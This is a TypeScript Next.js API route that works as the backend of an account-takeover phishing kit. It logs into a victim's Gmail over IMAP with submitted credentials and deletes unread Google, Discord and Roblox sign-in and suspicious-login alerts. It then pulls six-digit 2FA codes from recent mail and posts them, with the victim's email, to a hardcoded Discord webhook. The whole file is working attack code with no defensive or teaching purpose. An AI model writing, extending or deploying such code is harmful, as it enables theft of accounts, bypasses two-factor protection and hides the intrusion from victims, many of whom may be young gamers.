import { NextRequest, NextResponse } from 'next/server';
import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';
import * as imap from 'imap-simple';
import { simpleParser } from 'mailparser';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function log(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{ title, color, fields, timestamp: new Date().toISOString() }]
    })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  const { email, password } = await req.json();
  
  if (!email || !password) {
    return NextResponse.json({ error: 'Missing credentials' }, { status: 400 });
  }

  try {
    const config = {
      imap: {
        user: email,
        password: password,
        host: 'imap.gmail.com',
        port: 993,
        tls: true,
        authTimeout: 3000
      }
    };

    const conn = await imap.connect(config);
    await conn.openBox('INBOX');

    const alerts = await conn.search([
      'UNSEEN',
      ['OR', 
        ['FROM', 'no-reply@accounts.google.com'], 
        ['FROM', 'no-reply@discord.com'], 
        ['FROM', 'no-reply@roblox.com']
      ],
      ['OR', 
        ['SUBJECT', 'new sign-in'], 
        ['SUBJECT', 'suspicious'], 
        ['SUBJECT', 'login attempt']
      ]
    ]);

    if (alerts.length) {
      await conn.addFlags(alerts, '\\Deleted');
      await conn.expunge();
      await log('Security Alerts Deleted', [{ name: 'Email', value: email }], 0xffaa00);
    }

    const recent = await conn.search(['SINCE', new Date(Date.now() - 5 * 60 * 1000)]);
    
    for (const msg of recent) {
      const part = await conn.getPartData(msg, 'TEXT');
      const parsed = await simpleParser(part);
      const text = parsed.text || '';

      const codeMatch = text.match(/\b\d{6}\b/);
      if (codeMatch) {
        const code = codeMatch[0];
        const service = text.includes('discord') ? 'Discord' : 
                       text.includes('roblox') ? 'Roblox' : 'Other';
        
        await log(`${service} 2FA Code`, [
          { name: 'Code', value: `\`${code}\`` },
          { name: 'Email', value: email }
        ], 0x00ff00);
      }
    }

    conn.end();
    return NextResponse.json({ success: true });

  } catch (err) {
    const errorMessage = err instanceof Error ? err.message : String(err || 'Unknown error');
    
    await log('IMAP Connection Error', [
      { name: 'Email', value: email },
      { name: 'Error', value: errorMessage }
    ], 0xff0000);
    
    return NextResponse.json({ error: errorMessage }, { status: 500 });
  }
}
